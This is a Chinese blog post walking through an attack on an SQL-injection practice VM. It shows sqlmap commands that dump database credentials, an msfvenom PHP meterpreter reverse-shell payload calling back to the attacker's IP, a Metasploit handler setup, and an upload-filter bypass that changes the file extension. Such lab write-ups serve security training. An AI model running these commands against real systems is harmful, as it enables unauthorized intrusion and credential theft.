sql注入靶机

  • 2021-04-26
  • 作者 black
  • 1366 字
  • 次阅读
本文最后编辑于 前，其中的内容可能需要更新。

需要靶机的可以加我qq

kali ip:192.168.32.144
靶机 ip：192.168.32.145

开始

首先用nmap 扫描一下 扫描出来开启22端口和80端口
开启80端口说明可以访问网页

在浏览器上输入192.168.32.145
192.168.32.145为我靶机ip
得出以下页面

然后点击Admin

得到了登陆页面

看了很多大佬都用这个,然后自己也安装了一个, 用了用感觉真不错
OWASP ZAP

点击Automated Scan

会出来下面的页面
在http:// 后面输入靶机ip就行

点击攻击即可

点击警报 警报出了15处漏洞
含有sql注入漏洞

然后到kali里面利用sqlmap工具进行注入漏洞
在终端输入sqlmap -u “http://192.168.32.145/cat.php?id=1" –batch –dbs ：查看数据库
#- - batch - - dbs 有两个杠
得到这两个信息
[] information_schema
[] photoblog


输入sqlmap -u “http://192.168.32.145/cat.php?id=1" –batch –D photoblog –table
查看photoblog数据库下面的用户
得到
+————+
| categories |
| pictures |
| users |
+————+
三个用户

输入sqlmap -u “http://192.168.32.145/cat.php?id=1" –batch -D photoblog -T users –dump
查看photoblog数据库里的users里面的用户加密码
得到
+—-+——-+———————————————+
| id | login | password |
+—-+——-+———————————————+
| 1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2 (P4ssw0rd) |
+—-+——-+———————————————+
用户为admin
密码为P4ssw0rd

进入网页登陆 登陆进去为这样


点击一下这个 Add a new picture

会有一个上传文件的网页

利用msf生成php木马文件
输入msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.32.144 lport=4444 -f raw >shell.php


生成木马文件完成后
输入msfconsole ,进入框架
输入use exploit/multi/handler #利用模块
输入 set payload php/meterpreter/reverse_tcp #设置php文件反弹
输入set lhost 192.168.32.144 #设置反弹回到的主机ip

然后把文件上传到网页的选择文件

然后不知道为什么不管用
然后我百度一下php上传被限制 需要改成PHP
然后有改成PHP
上传成功后 页面为

点击shell就行
回到kali 就进入了meterpreter里面了
